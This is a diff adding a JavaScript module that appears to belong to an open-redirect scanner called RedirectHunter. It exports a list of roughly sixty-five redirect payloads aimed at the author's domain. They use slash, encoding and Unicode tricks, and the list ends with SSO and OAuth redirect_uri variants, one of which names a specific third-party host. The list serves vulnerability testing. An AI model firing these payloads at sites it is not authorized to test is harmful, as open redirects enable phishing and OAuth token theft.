@@ -1,0 +1,77 @@
+#!/usr/bin/env node
+
+/**
+ * RedirectHunter
+ * RedirectHunter is a powerful open redirect vulnerability scanner that helps you quickly identify and mitigate potential security risks in your web applications.
+ *
+ * @author karthikeyan V (karthithehacker) <https://karthithehacker.com>
+ */
+
+exports.payloads = [
+	
+	"///karthithehacker.com" ,
+    "/@karthithehacker.com" , 
+    "/karthithehacker.com" ,
+	"/karthithehacker.com/" , 
+    "//karthithehacker.com" ,
+    "//karthithehacker.com/" ,
+	"///karthithehacker.com/" , 
+    "//karthithehacker.com" , 
+    "/http://karthithehacker.com" ,
+	"/http://karthithehacker.com/" , 
+    "//http://karthithehacker.com" , 
+    "//http://karthithehacker.com/" ,
+	"///http://karthithehacker.com/" , 
+    "///http://karthithehacker.com" , 
+    "/>/karthithehacker.com" ,
+	"/>/karthithehacker.com/" , 
+    "/>//karthithehacker.com/" , 
+    "/>/karthithehacker.com" ,
+	"/>/http://karthithehacker.com" , 
+    "/>/http://karthithehacker.com/" , 
+    "/>//http://karthithehacker.com/" ,
+	"/>//http://karthithehacker.com" , 
+    "/<>/karthithehacker.com" , 
+    "/<>/karthithehacker.com/" ,
+	"/<>//karthithehacker.com/" , 
+    "/<>/karthithehacker.com" , 
+    "/<>/http://karthithehacker.com" ,
+	"/<>/http://karthithehacker.com/" , 
+    "/<>//http://karthithehacker.com/" , 
+    "/<>//http://karthithehacker.com" ,
+	"//#//karthithehacker.com" , 
+    "//#//karthithehacker.com/" , 
+    "//#//https://karthithehacker.com" ,
+	"//#//https://karthithehacker.com/" , 
+    "//#/https://karthithehacker.com/" , 
+    "//#/https://karthithehacker.com" ,
+	"//#/karthithehacker.com/" , 
+    "//#/karthithehacker.com" , 
+    "//karthithehacker.com/%2f%2e%2e" ,
+	"//https://karthithehacker.com/%2f%2e%2e" , 
+    "//https://karthithehacker.com/%2e%2e" ,	
+    "//karthithehacker.com/%2e%2e" ,
+	"//;https://karthithehacker.com/" , 
+    "//;https://karthithehacker.com" , 
+    "//;karthithehacker.com/" ,
+	"//;karthithehacker.com" , 
+    "//%09/karthithehacker.com" , 
+    "//%09/karthithehacker.com/" , 
+    "//%09/https://karthithehacker.com" ,
+	"//%09/https://karthithehacker.com/" ,	
+    "//%5ckarthithehacker.com" , 
+    "//%5ckarthithehacker.com/" ,
+	"//karthithehacker.com/..;/css" , 
+    "//https://karthithehacker.com/..;/css" , 
+    "//karthithehacker.com/..;/css" ,
+	"//karthithehacker.com" , 
+    "//karthithehacker.com/" , 
+    "//%EF%B9%B0/karthithehacker.com" ,
+    "//%EF%B9%B0/karthithehacker.com/" ,
+    "////https://karthithehacker.com/%2f%2e%2e",
+    "/%5C%5Ckarthithehacker.com/%252e%252e%252f",
+    "/?url=http://karthithehacker.com",
+    "/api/sso/v2/sso/jwt?error_url=http://karthithehacker.com ",
+    "/oauth/authorize?client_id=41441690836303948&redirect_uri=https://karthithehacker.com/&response_type=code&hd=proptiger.freshdesk.com"
+
+	]
